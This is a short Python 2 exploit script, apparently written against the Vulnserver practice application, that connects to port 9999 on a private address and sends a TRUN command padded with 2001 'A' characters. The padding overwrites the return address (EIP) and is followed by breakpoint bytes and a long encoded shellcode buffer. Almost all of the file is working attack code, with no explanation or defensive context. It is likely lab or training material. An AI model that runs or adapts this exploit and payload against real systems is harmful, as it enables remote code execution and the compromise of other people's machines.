# exploit2
#!/usr/bin/python
import socket
server = '10.121.0.53'
sport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

print ('Commands: STATS, RTIME, LTIME, SRUN, ' +
   'TRUN, GMON, GDOG, KSTET, GTER, HTER, LTER, KSTAN')
#print
#cmd = raw_input('Command: ')
#l0 = int(raw_input('Start length: '))
#l1 = int(raw_input('Stop length: '))
#lstep = int(raw_input('Length step: '))
cmd = 'TRUN .'
eip = '\xaf\x11\x50\x62'
buf =  ""
buf += "\xba\x86\xf5\x1e\x63\xdb\xcd\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x61\x31\x50\x15\x03\x50\x15\x83\xc0\x04\xe2"
buf += "\x73\x4f\xe6\x68\xa5\x4a\xcd\xb0\x80\xdf\xd6\xba\x69"
buf += "\x11\xde\xf2\xd6\xd2\x0b\x08\xd9\x87\xc5\xf2\xb2\x2d"
buf += "\xe6\xfb\x34\x9b\x4d\xfa\xf0\xf8\xe5\x24\xc4\x86\xd9"
buf += "\xae\xb9\x88\x4b\xdc\xaf\xf7\xbe\xa0\x01\x89\x0d\x3a"
buf += "\x30\x9d\xa4\x19\xe8\xa5\x70\xb9\x8b\x33\xdd\x82\xa6"
buf += "\x7b\x55\x58\x35\x93\xa7\x05\x90\x59\x2a\x01\x04\x02"
buf += "\xa0\xcb\x54\x1f\xf3\xcd\x45\xcf\xe2\x03\x71\x6e\x72"
buf += "\x26\x53\x17\x5f\x46\xf8\x7b\xda\x9d\x47\x53\x83\xb9"
buf += "\x4d\x88\x4d\x2a\xae\x2c\xc4\x8e\x24\x30\x33\x30\xae"
buf += "\xf6\xd7\x7b\xe1\x84\x05\xaf\x58\x97\xeb\xd5\x03\xf2"
buf += "\x67\x14\xc3\x07\x46\x0b\xbf\x61\xa5\x36\xe7\x7a\x0b"
buf += "\x53\x54\x66\xe0\x4e\xcf\x53\xd8\x01\xf6\xf2\x69\xac"
buf += "\xe0\xd6\x5c\x31\x87\xfb\x3b\xcc\x81\x31\x56\xb9\x38"
buf += "\x58\xc5\x28\x53\x5e\x0b\xff\xb7\xb0\x79\xb4\xfa\x1d"
buf += "\x46\x94\x71\x2b\xe6\xd5\x24\xca\x7d\x41\x6f\x4d\xf9"
buf += "\x6d\xfa\x5d\x93\xa3\xf7\x73\x6d\xac\xa6\x54\x7e\xf9"
buf += "\x20\x97\x50\x72\xf2\xdd\x51\x17\xa6\x26\x30\x45\x01"
buf += "\x8a\xdd\x03\x1a\x01\xd6\x73\x05\x3c\xb3\x8d\x5c\x12"
buf += "\x94\xba\x26\x6d\x3a\xc6\x25\x45\x7e\x20\xa3\x36\xf0"
buf += "\xe7\x5e\x22\xba\xb5\xfc\x95\x7e\xda\xb9\x23\x32\xe7"
buf += "\x4b\xac\xa3\x4a\x45\x18\x57\x25\xb3\x95\x85\x2b\x5b"
buf += "\x76\x5e\xec\x9d\x09\xb6\xa5\x0d\x74\xb2\x1b\x43\x52"
buf += "\x9c\xd5\x29\xf9\x31\x5c\x58\x7c\xcf\xd6\x14\x4e\x2c"
buf += "\x44\xb9\x9c\xf1\x93\x5d\x93\xd4\x1d\x58\x0e\x1a\x8c"
buf += "\x98\xd9\x95\xc8\x9c\x10\xc4\xb6\x8c\xad\xeb\x8c\x37"
buf += "\xef\x03\x61\x57\xb8\x73\x54\x39\x02\x85\x31\x47\x4d"
buf += "\x60\xef\xad\x8e\xb4\xe0\x0b\xff\x37\x09\x4e\xd7\x46"
buf += "\xbd\x43\x80\xc1\xbc\xda\x81\xf3\x1f\x56\xf0\xb2\xb2"
buf += "\xa9\x58\xf2\x20\x66\x4f\x80\xf7\x62\xf2\xaa\x47\x1c"
buf += "\x1d\x63\xcd\x37\x26\x1f\xff\x51\xa2\x1a\xf2"
interrupt = '\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC'
attack = 'A' * 2001 +'1111'+eip+interrupt+buf
s.send((cmd + ' ' + attack + '\r\n'))
print s.recv(1024)

s.send('EXIT\r\n')
print s.recv(1024)
s.close()
